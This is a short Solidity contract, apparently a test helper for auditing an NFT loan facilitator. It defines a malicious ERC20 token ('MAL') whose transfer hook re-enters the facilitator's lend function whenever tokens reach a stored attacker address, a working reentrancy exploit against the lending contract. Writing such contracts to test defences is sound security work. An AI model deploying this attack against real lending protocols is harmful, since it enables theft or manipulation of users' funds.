// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "../../interfaces/INFTLoanFacilitator.sol";

contract ReLendERC20 is ERC20, IERC721Receiver {
    INFTLoanFacilitator nftLoanFacilitator;

    address public attacker;

    constructor(address facilitatorAddress) ERC20("MAL", "MAL") {
        nftLoanFacilitator = INFTLoanFacilitator(facilitatorAddress);
        attacker = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
        if (from == address(0)) return;
        if (from == to) return;
        if (from == address(this)) return;
        if (to == attacker) {
            _mint(address(this), amount);
            _approve(address(this), address(nftLoanFacilitator), amount);
            nftLoanFacilitator.lend(1, 0, uint128(amount), type(uint32).max, attacker);
        }
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) public virtual override returns (bytes4) {
        return this.onERC721Received.selector;
    }
}